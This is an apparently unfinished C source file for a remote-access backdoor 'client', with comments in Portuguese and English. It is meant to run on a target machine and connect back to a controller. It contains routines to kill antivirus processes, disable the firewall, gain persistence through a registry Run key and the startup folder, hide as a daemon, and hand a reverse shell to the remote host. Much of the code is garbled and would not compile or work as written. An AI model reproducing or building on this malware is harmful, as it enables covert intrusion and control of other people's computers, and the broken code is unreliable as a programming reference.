/*
Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.

Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.

JÁ PRONTOS: desativar anti-virus e firewallro
            copiar-se para o registro
            copiar-se para o menu iniciar

terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.

// use without abuse.

// POC!

// coder  mrx6s0

*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <X11/Xlib.h>

#define remote_addr "127.0.0.1"
#define remote_port 2222

#define false 0
#define true 1

#define bytes 4096

/* struct of configurations to target. */

  typedef struct {

  char REMOTE_ADDR; /*remote_addr */
  int REMOTE_PORT; /* remote port */
  char commands[bytes];
  int x;
  //FILE *filecmd;

  } Target;

  int x = true;


  void
  error (char *err)

  {

  perror(err);
  exit(EXIT_FAILURE);

  } /* exit without exceptions... and keep the routine.
  //function  to disable antivirus. */

  void
  kill_antivirus()

  {
     //int i;
     FILE *arq;

    arq = fopen("av.txt", "rb");
    if(arq == NULL)
        return;
    if(( dup2(x,0)),dup2(x,1));
       execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
       send(x,"Killing anti virus...\n",31,0);
       execve("TASKKILL /F /IM \\{}\\ '>> NUL'", 0, 0);

       return;


   }

/* in this, i use a .vbs file, and invoked from execve(); */

  void
  kill_firewall()

  {

   dup2(x,0);
   execve("firewall.vbs", 0, 0);

   return;

  }

  // function that auto copy the software into the register of target machine

  void
  auto_copy()

  {

     dup2(x, 0);

     execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wopnt.exe",0,0);
     return;

  }

  void
  copy_to_registry()

  {

    dup2(x, 0);
    dup2(x,1);

    execve("copy /Y wopnt.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
    execve("cp wopnt.exe /usr",NULL,NULL); /* for  linux systems, probably will failed... */

    return;


    void
    background_life();

    {

    XFreeCursor; //magic happens here

    pid_t pid;

	pid = fork();

	if(pid < 0 )
        exit(EXIT_FAILURE);

    if(pid > 0)
        exit(EXIT_SUCCESS);

    else (setsid() < 0);
        exit(EXIT_FAILURE);

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        pid = fork();

        if (pid < 0)
            exit(EXIT_FAILURE);

        if (pid > 0)
            exit(EXIT_SUCCESS);

        /* hidden in all the ways */

        sigmask(0x01);
        chdir("/, C:\\, C:\\Windows\\System32,F:\\,G:\\,D:\\,E:\\,H:\\");

        }

        int k;

        for (k = sysconf(_SC_OPEN_MAX); k >= false; k--)


        {


        close(k);


        }


    return;

  }

  void
  shell()

  {
    int  x;
    struct sockaddr_in s;
    int root;
    char command[bytes];
    char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
    char *cmd[] = { "/bin/sh", (char *)0 };

    XFreeCursor; //magic happens here

    pid_t pid;

	pid = fork();

	if(pid < 0 )
        exit(EXIT_FAILURE);

    if(pid > 0)
        exit(EXIT_SUCCESS);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        pid = fork();

        if (pid < 0)
            exit(EXIT_FAILURE);

        if (pid > 0)
            exit(EXIT_SUCCESS);

        sigmask(0);
        chdir("/, C:\\, C:\\Windows\\System32");

        int k;

        for (k = sysconf(_SC_OPEN_MAX); k >= 0; k--)

        {
            close(k);

        /* daemon implanted. */

    /* setting up the connection */

     memset(s.sin_zero, '\0', sizeof s.sin_zero);
     s.sin_family = AF_INET; /* família de protocolos */
     s.sin_addr.s_addr = inet_addr(remote_addr);
     s.sin_port = htons(remote_port);
     malloc(sizeof (x));

     x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */

    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                   discomment this if u think necessary... */

     (connect(x, (struct sockaddr *)&s, sizeof(s)));
     if (connect == 0x0)
     perror("socket(SOCKET_CONNECT)connect_failed");

     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR)failed");

     /* fck, now  i have power!
      made conditions here. */
     if(recv(x,command,bytes,NULL) == true)
     send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);

     //handle with the impossible errors.

     if(recv(x,command,bytes,0)  < 0);
     perror("Connection failed:"); //

     if(connect == 0x0)
     perror("BREAK CONNECTION,(failure)");

     else

     if(recv(x,command,bytes,NULL) > 0);

     XFreeCursor;
     dup2(x, 0),dup2(x, 1),dup2(x, 2);
     root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);

     return;

     //free(x); /* freedom for x! */

     }



}


     /* execute the program */

     int main(int argc, char **argv)

     {
      char command[bytes], bufaux[bytes], *loc;
      int tbuf, escolha, pontarq;
      char comandos [] = "/shell /killav /exit";
      struct sockaddr_in s;
//      background_life();
     {

        /* setting up the connection */

     x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */

     memset(s.sin_zero, '\0', sizeof s.sin_zero);
     s.sin_family = AF_INET; /* família de protocolos */
     s.sin_addr.s_addr = inet_addr(remote_addr);
     s.sin_port = htons(remote_port);
     malloc(sizeof (x));

    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                   discomment this if u think necessary... */

     (connect(x, (struct sockaddr *)&s, sizeof(s))); {
     if (connect == 0x0)
     perror("socket(SOCKET_CONNECT)connect_failed");
     }

     {

     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR)failed");

     }

     strcpy(command,"\n ** Backdoor connected ** \n");
     strcpy(bufaux,command);
     send(x,command,strlen(command), 0);

    // Recebe ack do cli
     tbuf = recv(x, command,bytes, 0);
     command[tbuf]=0x00;
    // printf(">: %s\n",command);



     tbuf = recv(x,command,bytes,0);
     command[tbuf]=0x00;

     if (strncmp(command,"/",1) == 0)

     {

        loc = strstr(comandos,command);
        escolha = loc - comandos;

      }

   switch(escolha)

   {

     case 0:
      return;

     case 1:
     kill_antivirus();

     case 2:

     shell();

     case 3:

     auto_copy();

     case 4:
          //puts(">> Portas abertas no backdoor");
          system("netstat -ant > temp");
          pontarq = open("temp", O_RDONLY, 0666);
          if(pontarq < 0)
         {
              puts("Erro no arquivo temporario!");
         }
          tbuf = read(pontarq,command,sizeof(command));
          close(pontarq);
          send(x,command,tbuf,0);
          system("rm -r temp");
          return;


              }

            }


               while(true);


           {



        }




}

